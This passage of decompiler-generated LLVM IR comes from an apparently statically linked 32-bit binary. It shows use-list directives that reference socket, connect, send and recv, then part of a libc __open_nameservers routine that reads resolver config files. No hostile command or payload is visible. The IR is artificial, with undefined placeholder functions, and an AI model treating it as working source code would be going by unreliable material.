  uselistorder i32 %v0_80561ee, { 1, 0 }
  uselistorder i32 %v1_80561f5.pre-phi, { 4, 3, 2, 1, 0 }
  uselistorder i16 %stack_var_-192.1, { 1, 0 }
  uselistorder i32 %v0_80561a0.pre, { 1, 0 }
  uselistorder i32 %v5_8056173, { 1, 0 }
  uselistorder i32 %v3_8056173, { 2, 0, 1, 3 }
  uselistorder i32 %v1_805613b, { 0, 5, 4, 3, 2, 1, 6 }
  uselistorder i32 %v0_8056104, { 1, 0, 2, 3 }
  uselistorder i32 %v0_80560d2, { 1, 0 }
  uselistorder i32 %v3_80560b1, { 1, 0, 2 }
  uselistorder i32 %v0_80560a2, { 1, 0 }
  uselistorder i32 %v5_8056098, { 1, 0 }
  uselistorder i32* %v3_8056098, { 1, 0 }
  uselistorder i32 %v0_8055f6e81, { 0, 1, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_8056098, { 2, 1, 0 }
  uselistorder i32 %v5_8056092, { 1, 0 }
  uselistorder i32 %v1_8056091, { 2, 1, 0, 3 }
  uselistorder i32 %v1_805608d, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8056051, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9 }
  uselistorder i32 %v7_805602b, { 1, 0 }
  uselistorder i32 %v1_805601c, { 1, 0 }
  uselistorder i32 %v0_8055fdb, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_8055f82, { 1, 2, 0 }
  uselistorder i32 %v0_8055f82, { 4, 1, 2, 3, 0, 5 }
  uselistorder i32 %v5_8055f5c, { 1, 0 }
  uselistorder i32 %v1_8055f56, { 2, 1, 0, 3 }
  uselistorder i32 %v0_8055f51, { 1, 2, 0 }
  uselistorder i32 %v5_8055f5c58, { 1, 0 }
  uselistorder i32 %v5_8055efe, { 1, 0 }
  uselistorder i32 %v3_8055efe, { 2, 0, 1, 3 }
  uselistorder i32 %v3_8055eb6, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8055e9c, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_8055e9c, { 0, 1, 9, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 %v0_8055e7b, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_8055e5b, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_8055e01, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v0_8055de6, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v1_8055dcf, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8055d57, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8055d44, { 3, 0, 1, 2 }
  uselistorder i32 %v1_8055d0a, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8055ceb, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_8055ccf, { 1, 0 }
  uselistorder i32 %v3_8055cc4, { 2, 3, 0, 1, 5, 4, 6 }
  uselistorder i32 %v0_8055cc1, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32 %v0_8055c66, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 %v0_8055c61, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8055c4a, { 1, 0 }
  uselistorder i32 %v1_8055c16, { 3, 2, 1, 0 }
  uselistorder i32 %v0_8055c0792, { 2, 1, 0 }
  uselistorder i32 %v3_8055c1f, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i16 %v0_8055bc7, { 4, 5, 0, 1, 2, 3, 6 }
  uselistorder i32 %v15_8055bc0, { 6, 7, 4, 5, 3, 2, 0, 1, 8, 9, 10, 11, 13, 14, 15, 16, 17, 12 }
  uselistorder i32 %v2_8055b32, { 3, 7, 4, 2, 5, 10, 11, 1, 0, 9, 6, 8, 12, 13 }
  uselistorder i8** %stack_var_-252, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 78, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 66, 62, 63, 64, 65, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 79, 80, 81, 82, 83, 84 }
  uselistorder i32 51, { 2, 1, 0 }
  uselistorder i32 136, { 1, 2, 0 }
  uselistorder i32 132, { 1, 2, 3, 0 }
  uselistorder i32 148, { 1, 2, 0 }
  uselistorder i32 160, { 1, 3, 2, 4, 0 }
  uselistorder i32 68, { 6, 0, 3, 4, 5, 1, 2 }
  uselistorder i32 27, { 2, 3, 1, 0 }
  uselistorder i32 120, { 1, 2, 3, 4, 0 }
  uselistorder i32 67, { 1, 2, 0 }
  uselistorder i32 112, { 1, 5, 6, 7, 3, 4, 2, 0 }
  uselistorder i32 88, { 1, 2, 0 }
  uselistorder i32 72, { 2, 3, 4, 1, 5, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 4, 3, 2, 1, 0 }
  uselistorder i32 228, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 4, 5, 12, 11, 10, 9, 8, 7, 6, 3, 2, 1, 0 }
  uselistorder i32 101, { 0, 2, 3, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 2, 5, 4, 3, 6, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 1, 8, 7, 6, 5, 4, 3, 2, 9, 0 }
  uselistorder i32 17, { 18, 16, 10, 15, 5, 6, 4, 11, 12, 13, 14, 0, 19, 9, 2, 1, 17, 7, 8, 3 }
  uselistorder i32 176, { 4, 2, 3, 1, 0 }
  uselistorder i32 (i32)* @inet_addr, { 2, 4, 3, 1, 0 }
  uselistorder i32 158, { 1, 0 }
  uselistorder i32 156, { 1, 2, 0 }
  uselistorder i32 ptrtoint (i32* @0 to i32), { 3, 4, 0, 1, 2, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17, 18, 19, 16, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 53, 54, 51, 52, 55, 56 }
  uselistorder i32 172, { 1, 2, 3, 0 }
  uselistorder i32 224, { 0, 2, 1 }
  uselistorder i32 220, { 1, 2, 0 }
  uselistorder i32 260, { 2, 1, 0, 3 }
  uselistorder i32 184, { 3, 1, 2, 0 }
  uselistorder i32 ()* @__GI_strncat, { 1, 0 }
  uselistorder i32 200, { 2, 1, 3, 4, 0 }
  uselistorder i32 (i8*, i32, i32)* @strncpy, { 1, 2, 3, 0 }
  uselistorder i32 104, { 3, 0, 4, 2, 1 }
  uselistorder i32 116, { 3, 5, 0, 1, 6, 4, 2 }
  uselistorder i32 84, { 5, 1, 6, 2, 4, 3, 0 }
  uselistorder i32 -12, { 9, 3, 2, 4, 1, 5, 6, 7, 8, 10, 51, 50, 49, 16, 17, 11, 12, 13, 14, 15, 18, 19, 0, 20, 52, 26, 23, 21, 22, 24, 25, 27, 31, 32, 33, 29, 28, 30, 34, 40, 41, 39, 38, 37, 35, 36, 42, 43, 44, 45, 46, 47, 48 }
  uselistorder i32 -8, { 10, 4, 3, 5, 2, 6, 7, 8, 9, 11, 50, 45, 48, 46, 49, 51, 52, 47, 17, 18, 12, 13, 14, 15, 16, 19, 20, 21, 22, 24, 0, 23, 1, 25, 27, 28, 26, 29, 30, 31, 32, 37, 38, 36, 35, 34, 33, 39, 40, 41, 42, 43, 44 }
  uselistorder i32 (i32)* @__libc_close, { 16, 15, 14, 17, 25, 24, 23, 22, 21, 20, 19, 18, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 -16, { 27, 28, 29, 18, 20, 21, 17, 19, 16, 22, 15, 23, 24, 25, 26, 30, 98, 99, 36, 37, 31, 32, 33, 34, 35, 38, 39, 14, 40, 41, 53, 48, 49, 45, 46, 47, 50, 3, 1, 2, 4, 5, 51, 44, 6, 52, 42, 43, 0, 54, 55, 56, 61, 62, 63, 64, 65, 60, 58, 57, 59, 7, 66, 8, 9, 69, 70, 71, 68, 72, 73, 67, 74, 10, 11, 87, 88, 89, 84, 85, 86, 83, 82, 81, 80, 79, 75, 76, 77, 78, 90, 12, 13, 91, 92, 93, 94, 95, 96, 97 }
  uselistorder i16* @global_var_805b4e4.560, { 2, 1, 0 }
  uselistorder i64 4294967295, { 1, 2, 0, 3 }
  uselistorder i64* @global_var_80617a0.559, { 2, 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_8061788.558 to i32), { 4, 3, 2, 1, 0 }
  uselistorder i8** @global_var_8061788.558, { 1, 0 }
  uselistorder i32 1025, { 2, 3, 4, 0, 1 }
  uselistorder i32 512, { 10, 3, 11, 12, 5, 6, 0, 1, 2, 7, 8, 9, 4 }
  uselistorder i8* %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8056261, { 1, 0 }
  uselistorder label %dec_label_pc_805625e, { 1, 0 }
  uselistorder label %dec_label_pc_80561ee, { 1, 0 }
  uselistorder label %dec_label_pc_80561d8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80561c5, { 3, 2, 1, 0, 7, 6, 5, 4 }
  uselistorder label %dec_label_pc_80561a0.backedge, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8056198, { 1, 0 }
  uselistorder label %dec_label_pc_805617f, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8056134, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_80560d2, { 1, 0 }
  uselistorder label %dec_label_pc_80560a2, { 5, 2, 6, 4, 3, 0, 1 }
  uselistorder label %dec_label_pc_8056098, { 1, 0 }
  uselistorder label %dec_label_pc_805608d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805608a, { 1, 0 }
  uselistorder label %dec_label_pc_8056005, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8055f4d, { 1, 0 }
  uselistorder label %dec_label_pc_8055dcf, { 1, 0 }
  uselistorder label %dec_label_pc_8055d98, { 1, 0 }
  uselistorder label %dec_label_pc_8055d0a, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8055c16, { 1, 0 }
  uselistorder label %dec_label_pc_8055c00, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %v0_8056270 = load i32, i32* @ebp, align 4
  store i32 134563799, i32* %stack_var_-216, align 4
  %v3_805627f = ptrtoint i32* %stack_var_-216 to i32
  %v2_8056284 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8056284, i32* @eax, align 4
  %v2_805628c = call i32 @__pthread_return_void(i32 %v2_8056284, i32 134563799)
  %v1_8056298 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b4e8.497 to i32))
  store i32 %v1_8056298, i32* @eax, align 4
  %v0_80562a0 = load i32, i32* @global_var_8061bd4.498, align 4
  %tmp43 = icmp slt i32 %v0_80562a0, 1
  %tmp44 = icmp eq i1 %tmp43, false
  br i1 %tmp44, label %dec_label_pc_8056497, label %dec_label_pc_80562ad

dec_label_pc_80562ad:                             ; preds = %entry
  store i32 ptrtoint (i32* @global_var_805ab10.563 to i32), i32* %stack_var_-216, align 4
  %v2_80562b9 = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_805aade.564 to i32), i32 ptrtoint (i32* @global_var_805ab10.563 to i32))
  store i32 %v2_80562b9, i32* @eax, align 4
  store i32 %v2_80562b9, i32* @ebp, align 4
  %v1_80562c3 = icmp eq i32 %v2_80562b9, 0
  %v1_80562c5 = icmp eq i1 %v1_80562c3, false
  br i1 %v1_80562c5, label %dec_label_pc_8056462.preheader, label %dec_label_pc_80562cb

dec_label_pc_80562cb:                             ; preds = %dec_label_pc_80562ad
  store i32 ptrtoint (i32* @global_var_805ab10.563 to i32), i32* %stack_var_-216, align 4
  %v2_80562d7 = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_805aaef.565 to i32), i32 ptrtoint (i32* @global_var_805ab10.563 to i32))
  store i32 %v2_80562d7, i32* @ebp, align 4
  %v1_80562e1 = icmp eq i32 %v2_80562d7, 0
  %v1_80562e3 = icmp eq i1 %v1_80562e1, false
  br i1 %v1_80562e3, label %dec_label_pc_8056462.preheader, label %dec_label_pc_805648c

dec_label_pc_8056462.preheader:                   ; preds = %dec_label_pc_80562ad, %dec_label_pc_80562cb
  %v2_8056469 = ptrtoint i32* %stack_var_-180 to i32
  %v3_805639d = add i32 %v3_805627f, 164
  %v0_8056462103 = load i32, i32* @edx, align 4
  store i32 128, i32* %stack_var_-216, align 4
  store i32 %v2_8056469, i32* @ebx, align 4
  %v3_805646e104 = call i32 @fgets(i32 %v2_8056469, i32 128, i32 %v0_8056462103)
  store i32 %v3_805646e104, i32* @eax, align 4
  %v1_8056476105 = icmp eq i32 %v3_805646e104, 0
  %v1_8056478106 = icmp eq i1 %v1_8056476105, false
  br i1 %v1_8056478106, label %dec_label_pc_80562ef.preheader.lr.ph, label %dec_label_pc_805647e

dec_label_pc_80562ef.preheader.lr.ph:             ; preds = %dec_label_pc_8056462.preheader
  %v4_8056387 = inttoptr i32 %tmp to i8*
  br label %dec_label_pc_80562ef.preheader

dec_label_pc_80562ee:                             ; preds = %dec_label_pc_80562f9
  %v1_80562ee = add i32 %v0_80562ee57, 1
  store i32 %v1_80562ee, i32* @ebx, align 4
  %v1_80562ef = inttoptr i32 %v1_80562ee to i8*
  %v2_80562ef = load i8, i8* %v1_80562ef, align 1
  %v3_80562ef = zext i8 %v2_80562ef to i32
  %v5_80562ef = and i32 %v6_80562ef60, -256
  %v6_80562ef = or i32 %v3_80562ef, %v5_80562ef
  store i32 %v6_80562ef, i32* @ecx, align 4
  %v4_80562f1 = icmp eq i8 %v2_80562ef, 0
  br i1 %v4_80562f1, label %dec_label_pc_8056462.backedge, label %dec_label_pc_80562f9

dec_label_pc_80562f9:                             ; preds = %dec_label_pc_80562f9.lr.ph, %dec_label_pc_80562ee
  %v6_80562ef60 = phi i32 [ %v6_80562ef55, %dec_label_pc_80562f9.lr.ph ], [ %v6_80562ef, %dec_label_pc_80562ee ]
  %v2_80562ef59 = phi i8 [ %v2_80562ef52, %dec_label_pc_80562f9.lr.ph ], [ %v2_80562ef, %dec_label_pc_80562ee ]
  %v1_80562ef58 = phi i8* [ %v1_80562ef51, %dec_label_pc_80562f9.lr.ph ], [ %v1_80562ef, %dec_label_pc_80562ee ]
  %v0_80562ee57 = phi i32 [ %v0_80562ef.pre, %dec_label_pc_80562f9.lr.ph ], [ %v1_80562ee, %dec_label_pc_80562ee ]
  %v2_80562f9 = sext i8 %v2_80562ef59 to i32
  store i32 %v2_80562f9, i32* @edx, align 4
  store i32 %v0_80562fc.pre, i32* @eax, align 4
  %v2_8056301 = mul nsw i32 %v2_80562f9, 2
  %v3_8056301 = add i32 %v0_80562fc.pre, %v2_8056301
  %v4_8056301 = inttoptr i32 %v3_8056301 to i8*
  %v5_8056301 = load i8, i8* %v4_8056301, align 1
  %v6_8056301 = and i8 %v5_8056301, 32
  %v7_8056301 = icmp eq i8 %v6_8056301, 0
  %v1_8056305 = icmp eq i1 %v7_8056301, false
  br i1 %v1_8056305, label %dec_label_pc_80562ee, label %dec_label_pc_8056307

dec_label_pc_8056307:                             ; preds = %dec_label_pc_80562f9
  %v10_8056307 = icmp eq i8 %v2_80562ef59, 10
  br i1 %v10_8056307, label %dec_label_pc_8056462.backedge, label %dec_label_pc_8056310

dec_label_pc_8056462.backedge:                    ; preds = %dec_label_pc_80562ef.preheader, %dec_label_pc_80562ee, %dec_label_pc_8056428, %dec_label_pc_8056457, %dec_label_pc_805642f, %dec_label_pc_8056307, %dec_label_pc_8056310, %dec_label_pc_80563e1
  %v0_8056462 = load i32, i32* @edx, align 4
  store i32 128, i32* %stack_var_-216, align 4
  store i32 %v2_8056469, i32* @ebx, align 4
  %v3_805646e = call i32 @fgets(i32 %v2_8056469, i32 128, i32 %v0_8056462)
  store i32 %v3_805646e, i32* @eax, align 4
  %v1_8056476 = icmp eq i32 %v3_805646e, 0
  %v1_8056478 = icmp eq i1 %v1_8056476, false
  br i1 %v1_8056478, label %dec_label_pc_80562ef.preheader, label %dec_label_pc_805647e

dec_label_pc_8056310:                             ; preds = %dec_label_pc_8056307
  %v10_8056318 = icmp eq i8 %v2_80562ef59, 35
  %v1_805631b = icmp eq i1 %v10_8056318, false
  br i1 %v1_805631b, label %dec_label_pc_805636c.preheader, label %dec_label_pc_8056462.backedge

dec_label_pc_805636c.preheader:                   ; preds = %dec_label_pc_8056310
  %v2_805636c6 = load i8, i8* %v1_80562ef58, align 1
  %v3_805636c7 = icmp eq i8 %v2_805636c6, 0
  br i1 %v3_805636c7, label %dec_label_pc_8056378, label %dec_label_pc_8056371

dec_label_pc_8056322:                             ; preds = %dec_label_pc_8056371
  store i32 %stack_var_-196.013, i32* @eax, align 4
  %v1_8056326 = load i32, i32* @esp, align 4
  %v3_8056326 = mul nuw nsw i32 %stack_var_-196.013, 4
  %v4_8056326 = add nuw nsw i32 %v3_8056326, 152
  %v5_8056326 = add i32 %v4_8056326, %v1_8056326
  %v6_8056326 = inttoptr i32 %v5_8056326 to i32*
  store i32 %v0_8056326, i32* %v6_8056326, align 4
  %v0_8056330.pre = load i32, i32* @ebx, align 4
  %v4_8056330.pre = load i32, i32* @ecx, align 4
  %v1_805633061 = inttoptr i32 %v0_8056330.pre to i8*
  %v2_805633062 = load i8, i8* %v1_805633061, align 1
  %v3_805633063 = zext i8 %v2_805633062 to i32
  %v5_805633064 = and i32 %v4_8056330.pre, -256
  %v6_805633065 = or i32 %v3_805633063, %v5_805633064
  %v4_805633266 = icmp eq i8 %v2_805633062, 0
  br i1 %v4_805633266, label %dec_label_pc_805634f.preheader, label %dec_label_pc_8056336.lr.ph

dec_label_pc_8056336.lr.ph:                       ; preds = %dec_label_pc_8056322
  %v0_8056339.pre = load i32, i32* @global_var_805b278, align 8
  br label %dec_label_pc_8056336

dec_label_pc_805632f:                             ; preds = %dec_label_pc_8056344
  %v1_805632f = add i32 %v0_805632f67, 1
  store i32 %v1_805632f, i32* @ebx, align 4
  %v1_8056330 = inttoptr i32 %v1_805632f to i8*
  %v2_8056330 = load i8, i8* %v1_8056330, align 1
  %v3_8056330 = zext i8 %v2_8056330 to i32
  %v5_8056330 = and i32 %v6_805633069, -256
  %v6_8056330 = or i32 %v3_8056330, %v5_8056330
  %v4_8056332 = icmp eq i8 %v2_8056330, 0
  br i1 %v4_8056332, label %dec_label_pc_805634f.preheader, label %dec_label_pc_8056336

dec_label_pc_8056336:                             ; preds = %dec_label_pc_8056336.lr.ph, %dec_label_pc_805632f
  %v6_805633069 = phi i32 [ %v6_805633065, %dec_label_pc_8056336.lr.ph ], [ %v6_8056330, %dec_label_pc_805632f ]
  %v2_805633068 = phi i8 [ %v2_805633062, %dec_label_pc_8056336.lr.ph ], [ %v2_8056330, %dec_label_pc_805632f ]
  %v0_805632f67 = phi i32 [ %v0_8056330.pre, %dec_label_pc_8056336.lr.ph ], [ %v1_805632f, %dec_label_pc_805632f ]
  %v2_8056336 = sext i8 %v2_805633068 to i32
  store i32 %v2_8056336, i32* @edx, align 4
  store i32 %v0_8056339.pre, i32* @eax, align 4
  %v2_805633e = mul nsw i32 %v2_8056336, 2
  %v3_805633e = add i32 %v0_8056339.pre, %v2_805633e
  %v4_805633e = inttoptr i32 %v3_805633e to i8*
  %v5_805633e = load i8, i8* %v4_805633e, align 1
  %v6_805633e = and i8 %v5_805633e, 32
  %v7_805633e = icmp eq i8 %v6_805633e, 0
  %v1_8056342 = icmp eq i1 %v7_805633e, false
  br i1 %v1_8056342, label %dec_label_pc_805634f.preheader, label %dec_label_pc_8056344

dec_label_pc_8056344:                             ; preds = %dec_label_pc_8056336
  %v10_8056344 = icmp eq i8 %v2_805633068, 10
  %v1_8056347 = icmp eq i1 %v10_8056344, false
  br i1 %v1_8056347, label %dec_label_pc_805632f, label %dec_label_pc_805634f.preheader

dec_label_pc_805634f.preheader:                   ; preds = %dec_label_pc_8056344, %dec_label_pc_8056336, %dec_label_pc_805632f, %dec_label_pc_8056322
  %v0_805632f.lcssa = phi i32 [ %v0_8056330.pre, %dec_label_pc_8056322 ], [ %v1_805632f, %dec_label_pc_805632f ], [ %v0_805632f67, %dec_label_pc_8056336 ], [ %v0_805632f67, %dec_label_pc_8056344 ]
  %v6_8056330.lcssa = phi i32 [ %v6_805633065, %dec_label_pc_8056322 ], [ %v6_8056330, %dec_label_pc_805632f ], [ %v6_805633069, %dec_label_pc_8056336 ], [ %v6_805633069, %dec_label_pc_8056344 ]
  %v1_805634f75 = inttoptr i32 %v0_805632f.lcssa to i8*
  %v2_805634f76 = load i8, i8* %v1_805634f75, align 1
  %v3_805634f77 = zext i8 %v2_805634f76 to i32
  %v5_805634f78 = and i32 %v6_8056330.lcssa, -256
  %v6_805634f79 = or i32 %v3_805634f77, %v5_805634f78
  store i32 %v6_805634f79, i32* @ecx, align 4
  %v4_805635180 = icmp eq i8 %v2_805634f76, 0
  br i1 %v4_805635180, label %dec_label_pc_8056368, label %dec_label_pc_8056355

dec_label_pc_805634b:                             ; preds = %dec_label_pc_8056363, %dec_label_pc_8056355
  store i8 0, i8* %v1_805634f82, align 1
  %v0_805634e = load i32, i32* @ebx, align 4
  %v1_805634e = add i32 %v0_805634e, 1
  store i32 %v1_805634e, i32* @ebx, align 4
  %v4_805634f.pre = load i32, i32* @ecx, align 4
  %v1_805634f = inttoptr i32 %v1_805634e to i8*
  %v2_805634f = load i8, i8* %v1_805634f, align 1
  %v3_805634f = zext i8 %v2_805634f to i32
  %v5_805634f = and i32 %v4_805634f.pre, -256
  %v6_805634f = or i32 %v3_805634f, %v5_805634f
  store i32 %v6_805634f, i32* @ecx, align 4
  %v4_8056351 = icmp eq i8 %v2_805634f, 0
  br i1 %v4_8056351, label %dec_label_pc_8056368, label %dec_label_pc_8056355

dec_label_pc_8056355:                             ; preds = %dec_label_pc_805634f.preheader, %dec_label_pc_805634b
  %v2_805634f83 = phi i8 [ %v2_805634f, %dec_label_pc_805634b ], [ %v2_805634f76, %dec_label_pc_805634f.preheader ]
  %v1_805634f82 = phi i8* [ %v1_805634f, %dec_label_pc_805634b ], [ %v1_805634f75, %dec_label_pc_805634f.preheader ]
  %v0_805636c81 = phi i32 [ %v1_805634e, %dec_label_pc_805634b ], [ %v0_805632f.lcssa, %dec_label_pc_805634f.preheader ]
  %v2_8056355 = sext i8 %v2_805634f83 to i32
  store i32 %v2_8056355, i32* @edx, align 4
  %v0_8056358 = load i32, i32* @global_var_805b278, align 8
  store i32 %v0_8056358, i32* @eax, align 4
  %v2_805635d = mul nsw i32 %v2_8056355, 2
  %v3_805635d = add i32 %v0_8056358, %v2_805635d
  %v4_805635d = inttoptr i32 %v3_805635d to i8*
  %v5_805635d = load i8, i8* %v4_805635d, align 1
  %v6_805635d = and i8 %v5_805635d, 32
  %v7_805635d = icmp eq i8 %v6_805635d, 0
  %v1_8056361 = icmp eq i1 %v7_805635d, false
  br i1 %v1_8056361, label %dec_label_pc_805634b, label %dec_label_pc_8056363

dec_label_pc_8056363:                             ; preds = %dec_label_pc_8056355
  %v10_8056363 = icmp eq i8 %v2_805634f83, 10
  br i1 %v10_8056363, label %dec_label_pc_805634b, label %dec_label_pc_8056368

dec_label_pc_8056368:                             ; preds = %dec_label_pc_805634b, %dec_label_pc_8056363, %dec_label_pc_805634f.preheader
  %v0_805636c.lcssa = phi i32 [ %v0_805632f.lcssa, %dec_label_pc_805634f.preheader ], [ %v0_805636c81, %dec_label_pc_8056363 ], [ %v1_805634e, %dec_label_pc_805634b ]
  %v1_805634f.lcssa = phi i8* [ %v1_805634f75, %dec_label_pc_805634f.preheader ], [ %v1_805634f82, %dec_label_pc_8056363 ], [ %v1_805634f, %dec_label_pc_805634b ]
  %v4_8056368 = add nuw nsw i32 %stack_var_-196.013, 1
  %v2_805636c = load i8, i8* %v1_805634f.lcssa, align 1
  %v3_805636c = icmp eq i8 %v2_805636c, 0
  br i1 %v3_805636c, label %dec_label_pc_8056378, label %dec_label_pc_8056371

dec_label_pc_8056371:                             ; preds = %dec_label_pc_805636c.preheader, %dec_label_pc_8056368
  %v0_8056326 = phi i32 [ %v0_805636c.lcssa, %dec_label_pc_8056368 ], [ %v0_80562ee57, %dec_label_pc_805636c.preheader ]
  %stack_var_-196.013 = phi i32 [ %v4_8056368, %dec_label_pc_8056368 ], [ 0, %dec_label_pc_805636c.preheader ]
  %v7_8056376 = icmp sgt i32 %stack_var_-196.013, 4
  br i1 %v7_8056376, label %dec_label_pc_8056378, label %dec_label_pc_8056322

dec_label_pc_8056378:                             ; preds = %dec_label_pc_8056368, %dec_label_pc_8056371, %dec_label_pc_805636c.preheader
  %stack_var_-196.0.lcssa = phi i32 [ 0, %dec_label_pc_805636c.preheader ], [ %v4_8056368, %dec_label_pc_8056368 ], [ %stack_var_-196.013, %dec_label_pc_8056371 ]
  store i32 %tmp, i32* @edi, align 4
  %v0_805637f = load i32, i32* @esi, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_805ab07.566 to i32), i32* %stack_var_-216, align 4
  %v5_8056387 = call i32 @__GI_strcoll(i8* %v4_8056387, i32 ptrtoint ([11 x i8]* @global_var_805ab07.566 to i32), i32 %v0_805637f, i32 %v0_805637f)
  store i32 %v5_8056387, i32* @eax, align 4
  store i32 1, i32* @esi, align 4
  %v1_8056394 = icmp eq i32 %v5_8056387, 0
  br i1 %v1_8056394, label %dec_label_pc_80563bc.preheader, label %dec_label_pc_80563cd

dec_label_pc_80563bc.preheader:                   ; preds = %dec_label_pc_8056378
  %v5_80563c090 = icmp sgt i32 %stack_var_-196.0.lcssa, 1
  br i1 %v5_80563c090, label %dec_label_pc_80563c2.lr.ph, label %dec_label_pc_80563cd

dec_label_pc_80563c2.lr.ph:                       ; preds = %dec_label_pc_80563bc.preheader
  %v0_80563c2.pre = load i32, i32* @global_var_8061bd4.498, align 4
  br label %dec_label_pc_80563c2

dec_label_pc_805639a:                             ; preds = %dec_label_pc_80563c2
  %v2_805639d = mul i32 %v1_805639d91, 4
  %v4_805639d = add i32 %v2_805639d, %v3_805639d
  %v5_805639d = inttoptr i32 %v4_805639d to i32*
  %v6_805639d = load i32, i32* %v5_805639d, align 4
  %v1_80563a4 = inttoptr i32 %v6_805639d to i8*
  %v2_80563a4 = call i32 @__GI_strdup(i8* %v1_80563a4)
  %v0_80563a9 = load i32, i32* @esi, align 4
  %v1_80563a9 = add i32 %v0_80563a9, 1
  store i32 %v1_80563a9, i32* @esi, align 4
  %v1_80563aa = load i32, i32* @ebx, align 4
  %v2_80563aa = mul i32 %v1_80563aa, 4
  %v3_80563aa = add i32 %v2_80563aa, 134618056
  %v4_80563aa = inttoptr i32 %v3_80563aa to i32*
  store i32 %v2_80563a4, i32* %v4_80563aa, align 4
  %v0_80563b1 = load i32, i32* @ebx, align 4
  %v1_80563b1 = add i32 %v0_80563b1, 1
  store i32 %v1_80563b1, i32* @eax, align 4
  store i32 %v1_80563b1, i32* @global_var_8061bd4.498, align 4
  %v0_80563bc.pre = load i32, i32* @esi, align 4
  %v5_80563c0 = icmp slt i32 %v0_80563bc.pre, %stack_var_-196.0.lcssa
  br i1 %v5_80563c0, label %dec_label_pc_80563c2, label %dec_label_pc_80563cd

dec_label_pc_80563c2:                             ; preds = %dec_label_pc_80563c2.lr.ph, %dec_label_pc_805639a
  %v0_80563c2 = phi i32 [ %v0_80563c2.pre, %dec_label_pc_80563c2.lr.ph ], [ %v1_80563b1, %dec_label_pc_805639a ]
  %v1_805639d91 = phi i32 [ 1, %dec_label_pc_80563c2.lr.ph ], [ %v0_80563bc.pre, %dec_label_pc_805639a ]
  store i32 %v0_80563c2, i32* @ebx, align 4
  %v7_80563cb = icmp sgt i32 %v0_80563c2, 2
  br i1 %v7_80563cb, label %dec_label_pc_80563cd, label %dec_label_pc_805639a

dec_label_pc_80563cd:                             ; preds = %dec_label_pc_80563bc.preheader, %dec_label_pc_805639a, %dec_label_pc_80563c2, %dec_label_pc_8056378
  %v0_80563cd = load i32, i32* @ebx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_805ab12.567 to i32), i32* %stack_var_-216, align 4
  %v0_80563d4 = load i32, i32* @edi, align 4
  %v4_80563d5 = inttoptr i32 %v0_80563d4 to i8*
  %v5_80563d5 = call i32 @__GI_strcoll(i8* %v4_80563d5, i32 ptrtoint ([7 x i8]* @global_var_805ab12.567 to i32), i32 %v0_80563cd, i32 %v0_80563cd)
  store i32 %v5_80563d5, i32* @eax, align 4
  %v1_80563dd = icmp eq i32 %v5_80563d5, 0
  br i1 %v1_80563dd, label %dec_label_pc_805641f.preheader, label %dec_label_pc_80563e1

dec_label_pc_80563e1:                             ; preds = %dec_label_pc_80563cd
  %v0_80563e1 = load i32, i32* @ecx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_805ab19.568 to i32), i32* %stack_var_-216, align 4
  %v0_80563e8 = load i32, i32* @edi, align 4
  %v4_80563e9 = inttoptr i32 %v0_80563e8 to i8*
